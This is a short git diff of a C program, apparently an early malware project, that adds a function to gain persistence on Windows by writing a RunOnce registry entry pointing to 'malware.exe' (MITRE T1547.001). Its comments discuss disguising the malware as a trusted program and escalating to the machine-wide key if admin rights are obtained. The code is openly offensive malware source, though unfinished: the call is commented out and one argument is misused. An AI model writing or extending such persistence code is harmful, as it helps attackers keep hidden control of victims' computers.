@@ -18,6 +18,40 @@ BOOL copyExecutableToDisk(char* oldFilePath, char* newFilePath) {
 	return check;
 }
 
+void Persistence()
+{
+	// Use registry key to obtain persistence
+	// MITRE T1547.001
+
+	LPCSTR runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
+	HKEY runKeyResult = {0};
+
+	// Change to HKEY_LOCAL_MACHINE if we can get admin privileges
+	if (RegOpenKeyExA(
+		HKEY_CURRENT_USER, 
+		runKey, 
+		0, 
+		KEY_WRITE, 
+		&runKeyResult) == ERROR_SUCCESS) 
+	{
+		// Need to figure out what program (that Windows always runs) that we can disguise malware as
+		// Or, use a better name, filepath
+		LPCSTR valueName = "malware";
+		const BYTE* filePath = (LPBYTE)"C:\\Users\\Public\\temp\\malware.exe";
+		DWORD filePathLen = strlen("C:\\Users\\Public\\temp\\malware.exe");
+
+		RegSetValueExA(
+			runKeyResult, 
+			valueName, 
+			0, 
+			KEY_WRITE, 
+			filePath, 
+			filePathLen);
+	}
+
+	RegCloseKey(runKeyResult);
+}
+
 int main(int argc, char* argv[]) {
 
 	// File path where executable is being copied from (edit later)
@@ -32,6 +66,5 @@ int main(int argc, char* argv[]) {
 	}
 
 	// Run executable at startup
-	// Use 1 strategy from that website
-
+	// Persistence()
 }
